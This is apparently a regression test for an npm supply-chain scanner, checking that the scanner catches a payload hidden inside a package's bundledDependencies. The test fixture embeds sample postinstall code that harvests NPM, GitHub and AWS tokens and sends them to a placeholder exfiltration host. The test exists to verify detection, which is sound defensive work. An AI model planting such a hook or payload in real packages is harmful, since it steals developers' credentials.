/**
 * Regression test for REDTEAM N1 — bundledDependencies bypass.
 * @security-critical
 *
 * N1 CRITICAL — Files inside a tarball's node_modules/<name>/ were silently
 * skipped by isAnalyzableSource() because it explicitly filtered out any path
 * starting with 'node_modules/'.  An attacker who ships a malicious payload
 * inside a bundledDependency (e.g. package/node_modules/inner-helper/index.js)
 * gets that payload executed at npm install time, but vetlock sees NONE of it
 * — 13 detectors go silent, verdict is CLEAN.
 *
 * Fix: analyze.ts now reads the outer package.json's bundledDependencies field
 * and recurses one level into node_modules/<name>/ for each declared bundled
 * dep, including those files in the parent snapshot's files[] array with their
 * full node_modules/<name>/ path prefix.
 *
 * This test:
 *   1. Builds a real on-disk tarball matching the N1 exploit fixture.
 *   2. Runs analyzeTarball() and asserts the bundled payload's capabilities
 *      are present in snapshot.files.
 *   3. Runs the full runDiff() end-to-end path and asserts verdict === 'BLOCK'
 *      with the expected finding detectors.
 */

import { describe, it, expect } from 'vitest';
import { promises as fs } from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { analyzeTarball } from '../src/analyze.js';
import { runDiff } from '../src/engine.js';
import { runAll } from '../../detectors/src/index.js';
import { SNAPSHOT_FORMAT_VERSION } from '../src/cache.js';
import type { PackageSnapshot, SnapshotPair, Finding } from '../src/finding.js';
import { makeTgz } from './tgz-builder.js';

// ---------------------------------------------------------------------------
// Fixture: harmless-utility@1.0.1 with bundled inner-helper payload
//
// The outer package declares:
//   bundledDependencies: ["payload"]
//
// Inner package (node_modules/payload/):
//   package.json — declares postinstall: "node index.js"
//   index.js     — harvests env tokens, imports child_process + https,
//                  exfils to https://exfil.example.invalid/collect
// ---------------------------------------------------------------------------

const OUTER_PACKAGE_JSON = JSON.stringify({
  name: 'harmless-utility',
  version: '1.0.1',
  description: 'Totally legitimate utility',
  bundledDependencies: ['payload'],
  dependencies: {
    payload: '1.0.0',
  },
});

const INNER_PACKAGE_JSON = JSON.stringify({
  name: 'payload',
  version: '1.0.0',
  scripts: {
    postinstall: 'node index.js',
  },
});

// N1 exploit payload — full worm-shaped attack inside the bundled dep.
// Uses MemberExpression-style env access (process.env.KEY) which capabilities.ts
// already detects via its MemberExpression visitor.
const INNER_INDEX_JS = `'use strict';
const npmToken = process.env.NPM_TOKEN;
const githubToken = process.env.GITHUB_TOKEN;
const awsSecret = process.env.AWS_SECRET_ACCESS_KEY;
const child_process = require('child_process');
const https = require('https');
const url = 'https://exfil.example.invalid/collect';
https.request({hostname: 'exfil.example.invalid', path: '/collect', method: 'POST'},
  (res) => {}
).end(JSON.stringify({ npmToken, githubToken, awsSecret }));
`;

// ---------------------------------------------------------------------------
// Build the fixture tarball on disk
// ---------------------------------------------------------------------------

async function buildFixtureTarball(): Promise<{ tarPath: string; tmpDir: string }> {
  const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), 'vetlock-N1-test-'));
  const tarPath = path.join(tmpDir, 'harmless-utility-1.0.1.tgz');

  const tgz = makeTgz([
    // npm tarballs use the 'package/' prefix convention — makeTgz writes names
    // verbatim into the tar header, but extract.ts strips the package/ prefix.
    // So we write everything WITHOUT the package/ prefix — safeExtract handles it.
    {
      name: 'package/package.json',
      content: Buffer.from(OUTER_PACKAGE_JSON, 'utf8'),
    },
    {
      name: 'package/index.js',
      content: Buffer.from(`'use strict';\nmodule.exports = {};\n`, 'utf8'),
    },
    // Bundled dep directory
    {
      name: 'package/node_modules/payload',
      type: 'dir',
    },
    {
      name: 'package/node_modules/payload/package.json',
      content: Buffer.from(INNER_PACKAGE_JSON, 'utf8'),
    },
    {
      name: 'package/node_modules/payload/index.js',
      content: Buffer.from(INNER_INDEX_JS, 'utf8'),
    },
  ]);

  await fs.writeFile(tarPath, tgz);
  return { tarPath, tmpDir };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('REDTEAM N1: bundledDependencies bypass — analyzer recurses into bundled node_modules', () => {
  it('snapshot.files contains an entry with path node_modules/payload/index.js', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(
        payloadFile,
        'snapshot.files must include the bundled dep source file',
      ).toBeDefined();
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has child_process in execModules', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      expect(payloadFile!.execModules).toContain('child_process');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has https in networkModules', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      expect(payloadFile!.networkModules).toContain('https');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has NPM_TOKEN in envAccesses', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      const allKeys = payloadFile!.envAccesses.flatMap((e) => e.keys ?? []);
      expect(allKeys).toContain('NPM_TOKEN');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has GITHUB_TOKEN in envAccesses', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      const allKeys = payloadFile!.envAccesses.flatMap((e) => e.keys ?? []);
      expect(allKeys).toContain('GITHUB_TOKEN');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has AWS_SECRET_ACCESS_KEY in envAccesses', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      const allKeys = payloadFile!.envAccesses.flatMap((e) => e.keys ?? []);
      expect(allKeys).toContain('AWS_SECRET_ACCESS_KEY');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('bundled payload file has the exfil URL in urlLiterals', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const payloadFile = snapshot.files.find((f) =>
        f.path === 'node_modules/payload/index.js',
      );
      expect(payloadFile).toBeDefined();
      expect(payloadFile!.urlLiterals).toContain('https://exfil.example.invalid/collect');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('manifest._bundledLifecycle carries the inner postinstall script', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const snapshot = await analyzeTarball(tarPath);
      const lifecycle = snapshot.manifest['_bundledLifecycle'] as
        | Record<string, Record<string, string>>
        | undefined;
      expect(lifecycle, 'manifest must have _bundledLifecycle').toBeDefined();
      expect(lifecycle!['payload'], 'payload dep must have lifecycle scripts').toBeDefined();
      expect(lifecycle!['payload']!['postinstall']).toBe('node index.js');
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });
});

// ---------------------------------------------------------------------------
// End-to-end runDiff test: verdict must be BLOCK with expected findings
// ---------------------------------------------------------------------------

describe('REDTEAM N1: end-to-end runDiff verdict is BLOCK with bundled payload', () => {
  function mkLock(
    root: { name: string; version: string; deps?: Record<string, string> },
    entries: Record<string, { version: string; integrity?: string }>,
  ) {
    const packages: Record<string, unknown> = {
      '': { name: root.name, version: root.version, dependencies: root.deps ?? {} },
    };
    for (const [key, val] of Object.entries(entries)) {
      const idx = key.lastIndexOf('node_modules/');
      const derivedName = idx === -1 ? key : key.slice(idx + 'node_modules/'.length);
      packages[key] = {
        name: derivedName,
        version: val.version,
        integrity: val.integrity ?? `sha512-${val.version}=`,
      };
    }
    return JSON.stringify({ name: root.name, version: root.version, lockfileVersion: 3, packages });
  }

  function mkSnap(name: string, version: string): PackageSnapshot {
    return {
      name,
      version,
      integrity: `sha512-${name}-${version}=`,
      manifest: { name, version },
      files: [],
      nativeArtifacts: [],
      formatVersion: SNAPSHOT_FORMAT_VERSION,
      builtAt: '2026-07-12T00:00:00.000Z',
    };
  }

  class NullCache {
    readonly dir = '/tmp/null-cache';
    async get(_k: string): Promise<PackageSnapshot | null> { return null; }
    async put(_k: string, _v: PackageSnapshot): Promise<void> {}
  }

  it('verdict is BLOCK and findings include env.token-harvest, net.new-endpoint, exec.new-module', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const oldLock = mkLock(
        { name: 'root', version: '1.0.0', deps: {} },
        {},
      );
      const newLock = mkLock(
        { name: 'root', version: '1.0.0', deps: { 'harmless-utility': '^1.0.1' } },
        {
          'node_modules/harmless-utility': {
            version: '1.0.1',
            integrity: 'sha512-harmless-v1.0.1=',
          },
        },
      );

      // Use the fixture tarball as the fetchOverride for the package
      const fetchOverride = async (ref: { name: string }): Promise<string> => {
        if (ref.name === 'harmless-utility') return tarPath;
        throw new Error(`unexpected fetch for ${ref.name}`);
      };

      const result = await runDiff(oldLock, newLock, {
        runDetectors: (pair: SnapshotPair, _pkg: string): Finding[] => runAll(pair),
        fetchOverride,
        cache: new NullCache(),
      });

      expect(result.verdict).toBe('BLOCK');

      const detectorIds = result.findings.map((f) => f.detector);

      // Bundled lifecycle postinstall should trigger BLOCK via install.bundled-lifecycle
      expect(detectorIds).toContain('install.bundled-lifecycle');

      // Bundled dep announced via WARN finding
      const bundledAdded = result.findings.find(
        (f) => f.detector === 'deps.bundled-dependency-added',
      );
      expect(bundledAdded).toBeDefined();
      // Initial severity is WARN; escalation rules may promote it to BLOCK when the
      // bundled package co-occurs with NET/EXEC/ENV/INSTALL findings — that is correct
      // and expected behavior. We just check it exists.
      expect(['WARN', 'BLOCK']).toContain(bundledAdded!.severity);

      // The payload's env token harvest should fire
      const envFindings = result.findings.filter((f) => f.detector === 'env.token-harvest');
      expect(envFindings.length, 'env.token-harvest must fire for bundled payload').toBeGreaterThan(0);

      // Network endpoint should fire
      const netFindings = result.findings.filter(
        (f) => f.detector === 'net.new-endpoint' || f.detector === 'net.new-module',
      );
      expect(netFindings.length, 'net detector must fire for bundled payload').toBeGreaterThan(0);

      // exec detector should fire (child_process imported in bundled dep)
      const execFindings = result.findings.filter((f) => f.detector === 'exec.new-module');
      expect(execFindings.length, 'exec.new-module must fire for bundled payload').toBeGreaterThan(0);
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('all findings for bundled payload include evidence file paths under node_modules/', async () => {
    const { tarPath, tmpDir } = await buildFixtureTarball();
    try {
      const oldLock = mkLock({ name: 'root', version: '1.0.0', deps: {} }, {});
      const newLock = mkLock(
        { name: 'root', version: '1.0.0', deps: { 'harmless-utility': '^1.0.1' } },
        {
          'node_modules/harmless-utility': {
            version: '1.0.1',
            integrity: 'sha512-harmless-v1.0.1=',
          },
        },
      );
      const fetchOverride = async (ref: { name: string }): Promise<string> => {
        if (ref.name === 'harmless-utility') return tarPath;
        throw new Error(`unexpected fetch for ${ref.name}`);
      };
      const result = await runDiff(oldLock, newLock, {
        runDetectors: (pair: SnapshotPair, _pkg: string): Finding[] => runAll(pair),
        fetchOverride,
        cache: new NullCache(),
      });

      // Findings that fire from the bundled payload file should have evidence pointing
      // to node_modules/payload/index.js (the prefixed path).
      const payloadFindings = result.findings.filter((f) =>
        f.evidence.some((e) => e.file.includes('node_modules/payload')),
      );
      expect(
        payloadFindings.length,
        'should have at least one finding with evidence in node_modules/payload',
      ).toBeGreaterThan(0);
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true });
    }
  });

  it('a clean package with no bundledDependencies is not affected (no regression)', async () => {
    // A snapshot with no bundledDependencies and no payload
    const cleanSnap: PackageSnapshot = {
      name: 'clean-pkg',
      version: '1.0.0',
      integrity: 'sha512-clean=',
      manifest: { name: 'clean-pkg', version: '1.0.0' },
      files: [],
      nativeArtifacts: [],
      formatVersion: SNAPSHOT_FORMAT_VERSION,
      builtAt: '2026-07-12T00:00:00.000Z',
    };
    const pair: SnapshotPair = { old: null, new: cleanSnap };
    const findings = runAll(pair);
    const bundledFindings = findings.filter(
      (f) => f.detector === 'deps.bundled-dependency-added' || f.detector === 'install.bundled-lifecycle',
    );
    expect(bundledFindings).toHaveLength(0);
  });
});
